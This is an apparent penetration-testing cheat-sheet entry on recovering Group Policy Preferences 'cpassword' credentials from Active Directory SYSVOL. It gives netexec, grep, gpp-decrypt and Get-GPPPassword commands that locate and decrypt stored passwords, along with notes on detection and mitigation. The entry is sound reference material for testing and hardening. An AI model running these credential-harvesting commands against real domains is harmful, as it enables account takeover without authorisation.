---
title: GPP passwords (cpassword)
category: AD / GPO
order: 10
tags: [gpp, cpassword, sysvol, ms14-025, credentials]
summary: >
  Old Group Policy Preferences stored credentials in SYSVOL XML encrypted with a
  key Microsoft published. Any domain user can read SYSVOL, so any leftover
  cpassword is a free credential.
prerequisites:
  - Any domain account (SYSVOL is world-readable to authenticated users)
tools: [netexec, Get-GPPPassword, gpp-decrypt]
detection:
  - Reads of Groups.xml / cpassword in SYSVOL; the fixed AES key is public
mitigation:
  - Patch MS14-025; purge cpassword from SYSVOL; use LAPS instead
refs:
  - { label: "adsecurity — GPP", url: "https://adsecurity.org/?p=2288" }
  - { label: "HackTricks — GPP", url: "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges" }
---

Group Policy Preferences could set local accounts / mapped-drive creds; the
password was stored as `cpassword` in files like `Groups.xml`, encrypted with an
**AES key Microsoft published in the docs**. SYSVOL is readable by every domain
user, so these decrypt trivially.

## Find + decrypt

```sh
# netexec pulls and decrypts cpassword from SYSVOL in one go
netexec smb $dc_ip -u $user -p $password -M gpp_password
```

```sh
# manual: grep SYSVOL then decrypt
grep -rn "cpassword" /mnt/sysvol/    # after mounting \\$dc_host\SYSVOL
gpp-decrypt '<cpassword blob>'
```

```powershell
# from Windows
Get-GPPPassword
```

> Also check for `gppautologin`, `Services\Services.xml`, `ScheduledTasks.xml`,
> `Printers.xml`, `Drives.xml` — the same cpassword field appears across GPP types.
